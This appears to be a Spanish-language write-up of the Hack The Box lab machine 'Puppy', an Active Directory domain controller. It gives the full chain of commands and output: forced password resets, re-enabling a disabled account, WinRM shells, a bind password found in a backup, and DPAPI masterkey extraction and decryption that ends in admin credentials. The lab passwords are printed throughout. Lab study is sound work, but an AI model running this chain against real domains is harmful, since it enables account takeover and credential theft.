# PUPPY

- Creds: user: `levi.james` pass: `KingofAkron2025!`

## Escaneo de Puertos:

```bash
Bug in iscsi-info: no string output.
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus

88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-23 17:58:51Z)

111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status

135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m59s
| smb2-time: 
|   date: 2025-07-23T18:00:45
|_  start_date: N/A

389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)

464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0

636/tcp   open  tcpwrapped
3269/tcp  open  tcpwrapped

2049/tcp  open  nlockmgr      1-4 (RPC #100021)

3260/tcp  open  iscsi?

5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found

9389/tcp  open  mc-nmf        .NET Message Framing

49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0

49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
54485/tcp open  msrpc         Microsoft Windows RPC
54494/tcp open  msrpc         Microsoft Windows RPC
54509/tcp open  msrpc         Microsoft Windows RPC
```

## DNS
```bash
dig ANY @10.10.11.70 puppy.htb

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> ANY @10.10.11.70 puppy.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 5347
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;puppy.htb.			IN	ANY

;; ANSWER SECTION:
puppy.htb.		600	IN	A	10.10.11.70
puppy.htb.		3600	IN	NS	dc.puppy.htb.
puppy.htb.		3600	IN	SOA	dc.puppy.htb. hostmaster.puppy.htb. 176 900 600 86400 3600

;; ADDITIONAL SECTION:
dc.puppy.htb.		3600	IN	A	10.10.11.70    

;; Query time: 96 msec
;; SERVER: 10.10.11.70#53(10.10.11.70) (TCP)
;; WHEN: Thu Jul 24 13:48:04 CEST 2025
;; MSG SIZE  rcvd: 134
```

- Domain Controler (DC) : `dc.puppy.htb`

## SMB

```bash
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m59s
| smb2-time: 
|   date: 2025-07-23T18:00:45
|_  start_date: N/A
```
```bash
netexec smb $IP -u "levi.james" -p 'KingofAkron2025!' --users

SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
SMB         10.10.11.70     445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.10.11.70     445    DC               Administrator                 2025-02-19 19:33:28 0       Built-in account for administering the computer/domain 
SMB         10.10.11.70     445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.10.11.70     445    DC               krbtgt                        2025-02-19 11:46:15 0       Key Distribution Center Service Account 
SMB         10.10.11.70     445    DC               levi.james                    2025-02-19 12:10:56 0        
SMB         10.10.11.70     445    DC               ant.edwards                   2025-02-19 12:13:14 0        
SMB         10.10.11.70     445    DC               adam.silver                   2025-07-23 20:19:29 0        
SMB         10.10.11.70     445    DC               jamie.williams                2025-02-19 12:17:26 0        
SMB         10.10.11.70     445    DC               steph.cooper                  2025-02-19 12:21:00 0        
SMB         10.10.11.70     445    DC               steph.cooper_adm              2025-03-08 15:50:40 0        
SMB         10.10.11.70     445    DC               [*] Enumerated 9 local users: PUPPY
```

### Usuarios:

- `levi.james`
  - Display Name: ``
  - Grupos: 
    - `USERS`
    - `DOMAIN USERS`
    - `HR` -----> GenericWrite ----> `DEVELOPERS` 


- `ant.edwards`:
  - Pass: `Antman2025!` ---> **Funciona** 
  - Display Name: `Anthony J. Edwards`
  - Grupos:
    - **DEVELOPERS**
    - **DOMAIN NAME**
    - **USERS**
    - **SENIOR DEVS** -----> GenericAll -----> `adam.silver`


- `jamie.williams`
  - Pass: `JamieLove2025!` ---> **No Funciona**
  - Display Name: `Jamie S. Williams`
  - Grupos:
    - `**DEVELOPERS**


- `adam.silver`
  - Pass: `HJKL2025!` ---> **No Funciona** 
  - Display Name: `Adam D. Silver`
  - Grupos:
    - **USERS**
    - **REMOTE MANAGEMENT USERS**
    - **DEVELOPERS**
    - **DOMAIN USERS**


- `steph.cooper`
  - Display Name: `Stephen W. Cooper` 
  - Grupos:
    - **REMOTE MANAGEMENT USERS**


- `steph.cooper_adm` -- **ADMIN**
  - Display Name: `Stephen W. Cooper`
  - Grupos:
    - **ADMINISTRATORS**


### Obteniendo control de usuario `adam.silver`

```bash
 net rpc password "adam.silver" 'p@ssword123' -U "PUPPY.HTB"/"ant.edwards"%'Antman2025!' -S "dc.puppy.htb"
❯ nxc smb $IP -u 'adam.silver' -p 'p@ssword123'
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:p@ssword123 STATUS_ACCOUNT_DISABLED 
```

- Logramos cambiar contraseña
- Esta deshabilitado en **SMB**

```bash
evil-winrm -i puppy.htb -u 'adam.silver' -p 'p@ssword123'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1
```

- No autorizado para **winrm** a pesar de pertenecer al grupo `REMOTE MANAGEMENT USERS`

```bash
bloodyAD --host $IP -u 'ant.edwards' -p 'Antman2025!' -d puppy.htb remove uac adam.silver -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from adam.silver's userAccountControl
```

- Habilitamos al usuario

```bash
evil-winrm -i puppy.htb -u 'adam.silver' -p 'p@ssword123'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\adam.silver\Documents> 
```

## Escalando Privilegios

```bash

*Evil-WinRM* PS C:\Backups> dir


    Directory: C:\Backups


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip
'''

- Encontramos un directorio `Backups`, con un archivo zip y lo descargamos

```bash
*Evil-WinRM* PS C:\Backups> download site-backup-2024-12-30.zip /home/albert/Descargas/site-backup-2024-12-30.zip
                                        
Info: Downloading C:\Backups\site-backup-2024-12-30.zip to /home/albert/Descargas/site-backup-2024-12-30.zip
```

### Contenido del `.zip`

```bash
❯ ls
 assets   images   index.html  󰁯 nms-auth-config.xml.bak

❯ catnp nms-auth-config.xml.bak
<?xml version="1.0" encoding="UTF-8"?>
<ldap-config>
    <server>
        <host>DC.PUPPY.HTB</host>
        <port>389</port>
        <base-dn>dc=PUPPY,dc=HTB</base-dn>
        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
        <bind-password>ChefSteph2025!</bind-password>
    </server>
    <user-attributes>
        <attribute name="username" ldap-attribute="uid" />
        <attribute name="firstName" ldap-attribute="givenName" />
        <attribute name="lastName" ldap-attribute="sn" />
        <attribute name="email" ldap-attribute="mail" />
    </user-attributes>
    <group-attributes>
        <attribute name="groupName" ldap-attribute="cn" />
        <attribute name="groupMember" ldap-attribute="member" />
    </group-attributes>
    <search-filter>
        <filter>(&(objectClass=person)(uid=%s))</filter>
    </search-filter>
</ldap-config>
```

- username: `steph.cooper`
- password: `ChefSteph2025!`

### Investigando sistema con `steph.cooper`

```bash
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> ls -force


    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:40 AM            740 556a2412-1275-4ccf-b721-e6a0b4f90407
-a-hs-         2/23/2025   2:36 PM             24 Preferred
```

- Encontramos `masterkey` de **DPAPI**
- Al intentar descargarla con evil-winrm nos da error:
```bash
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> download 556a2412-1275-4ccf-b721-e6a0b4f90407 /home/albert/Descargas/encrypted_file
                                        
Info: Downloading C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407 to /home/albert/Descargas/encrypted_file
                                        
Error: Download failed. Check filenames or paths: uninitialized constant WinRM::FS::FileManager::EstandardError

          rescue EstandardError => err
                 ^^^^^^^^^^^^^^
Did you mean?  StandardError
```

- Utilizamos base64 para obtener el archivo: 

```bash
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> $filePath = 'C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407'
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> [Convert]::ToBase64String($fileBytes)
AgAAAAAAAAAAAAAANQA1ADYAYQAyADQAMQAyAC0AMQAyADcANQAtADQAYwBjAGYALQBiADcAMgAxAC0AZQA2AGEAMABiADQAZgA5ADAANAAwADcAAABqVXUSz0wAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAAsj8xITRBgEgAZOArghULmlBGAAAJgAAAA2YAAPtTG5NorNzxhcfx4/jYgxj+JK0HBHMu8jL7YmpQvLiX7P3r8JgmUe6u9jRlDDjMOHDoZvKzrgIlOUbC0tm4g/4fwFIfMWBq0/fLkFUoEUWvl1/BQlIKAYfIoVXIhNRtc+KnqjXV7w+BAgAAAIIHeThOAhE+Lw/NTnPdszJQRgAACYAAAANmAAAnsQrcWYkrgMd0xLdAjCF9uEuKC2mzsDC0a8AOxgQxR93gmJxhUmVWDQ3j7+LCRX6JWd1L/NlzkmxDehild6MtoO3nd90f5dACAAAAAAEAAFgAAADzFsU+FoA2QrrPuakOpQmSSMbe5Djd8l+4J8uoHSit4+e1BHJIbO28uwtyRxl2Q7tk6e/jjlqROSxDoQUHc37jjVtn4SVdouDfm52kzZT2VheO6A0DqjDlEB19Qbzn9BTpGG4y7P8GuGyN81sbNoLN84yWe1mA15CSZPHx8frov6YwdLQEg7H8vyv9ZieGhBRwvpvp4gTur0SWGamc7WN590w8Vp98J1n3t3TF8H2otXCjnpM9m6exMiTfWpTWfN9FFiL2aC7Gzr/FamzlMQ5E5QAnk63b2T/dMJnp5oIU8cDPq+RCVRSxcdAgUOAZMxPs9Cc7BUD+ERVTMUi/Jp7MlVgK1cIeipAl/gZz5asyOJnbThLa2ylLAf0vaWZGPFQWaIRfc8ni2iVkUlgCO7bI9YDIwDyTGQw0Yz/vRE/EJvtB4bCJdW+Ecnk8TUbok3SGQoExL3I5Tm2a/F6/oscc9YlciWKEmqQ=
```

```bash
dpapi.py masterkey -file encrypted_file -sid S-1-5-21-1487982659-1829050783-2281216199-1107
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
Flags       :        0 (0)
Policy      : 4ccf1275 (1288639093)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Password:
Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

#### Posibles datos encriptados: 

- `C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D`
  - **Sin datos de interes** 

- `C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9`

```bash
dpapi.py credential -file encrypted_file -key '0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PUPPY.HTB
Description : 
Unknown     : 
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!
```
